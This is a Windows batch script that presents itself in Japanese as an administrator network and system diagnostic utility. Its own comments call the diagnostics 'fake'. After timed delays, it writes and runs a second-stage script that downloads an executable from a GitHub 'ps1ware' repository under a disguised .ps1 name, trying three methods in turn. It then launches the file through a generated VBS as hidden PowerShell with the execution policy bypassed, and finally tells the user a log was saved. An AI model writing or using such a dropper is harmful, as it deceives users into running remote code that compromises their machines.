@echo off
setlocal enabledelayedexpansion
title [管理者診断ユーティリティ]
color 0A

echo =====================================================
echo           管理者用ネットワーク／システム診断ユーティリティ
echo =====================================================
echo [+] 初期化中...
timeout /t 2 >nul

:: Fake diagnostic functions
echo [INFO] ネットワークスタック確認中...
netsh winsock show catalog >nul
echo [INFO] システムリソースの照会...
fsutil behavior query DisableDeleteNotify >nul
echo [INFO] DCOM設定の確認...
dcomcnfg /32 >nul
timeout /t 1 >nul

echo [INFO] ユーザーアクティビティを確認中...
wevtutil qe Security "/q:*[System[(EventID=4624)]]" /f:text /c:1 >nul
timeout /t 1 >nul

echo [INFO] 不審な接続をスキャン中...
netstat -bno >nul
route print >nul
timeout /t 1 >nul

echo [INFO] システムサービス確認中...
sc queryex type= service >nul
timeout /t 1 >nul

echo [INFO] WMI チェック中...
wmic logicaldisk get caption,filesystem,freespace,size >nul
timeout /t 1 >nul

:: 50x random sub-sleeps
echo [*] 詳細検証を実行中... (50 ステップ)
for /l %%i in (1,1,50) do (
    set /a delay=(%RANDOM% %% 60) + 120
    powershell -Command "Start-Sleep -Milliseconds !delay!"
)

:: Random delay before launching stage 2
set /a mainDelay=(%RANDOM% %% 4) + 3
echo [INFO] 補助診断モジュールを準備中... (%mainDelay% 秒後に実行)
timeout /t %mainDelay% >nul

:: Build second stage BAT (stage2.bat)
set "stage2=%~dp0stage2.bat"
(
    echo @echo off
    echo setlocal enabledelayedexpansion
    echo title 補助診断モジュール
    echo echo [*] ネットワークテストを再実行中...
    echo ping -n 2 1.1.1.1 ^>nul
    echo tracert -h 2 8.8.8.8
    echo ipconfig /flushdns
    echo timeout /t 2 ^>nul
    echo echo [*] ランダム遅延を実行中...
    echo set /a delay2=(^%%RANDOM^%% ^%% 8) + 3
    echo timeout /t !delay2! ^>nul
    echo echo [*] GitHub からモジュールを取得中...
    echo set "url=https://github.com/s-b-repo/ps1ware/raw/main/ELDRITCHSOUP.EXE"
    echo set "outfile=%%~dp0diagnostic_report.ps1"
    echo powershell -Command ^
        "try { Invoke-WebRequest -Uri '!url!' -OutFile '!outfile!' -UseBasicParsing } catch { " ^
        "try { Start-BitsTransfer -Source '!url!' -Destination '!outfile!' } catch { " ^
        "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('!url!', '!outfile!') }}" 
    echo timeout /t 2 ^>nul
    echo echo [*] ステルス起動用VBSを生成中...
    echo ^(
    echo Set shell = CreateObject("WScript.Shell"^)
    echo shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""diagnostic_report.ps1""", 0, False
    echo ^) ^> "%%~dp0launch_hidden.vbs"
    echo timeout /t 1 ^>nul
    echo echo [*] スクリプト実行中...
    echo cscript //nologo "%%~dp0launch_hidden.vbs"
    echo echo [*] 補助診断完了。
) > "%stage2%"

:: Random delay before running stage 2
set /a rdelay=(%RANDOM% %% 5) + 2
echo [INFO] stage2.bat を %rdelay% 秒後に実行します...
timeout /t %rdelay% >nul

:: Run stage2
call "%stage2%"

echo [√] 全診断完了。ログは "diagnostic_report.ps1" に保存されました。
pause
exit
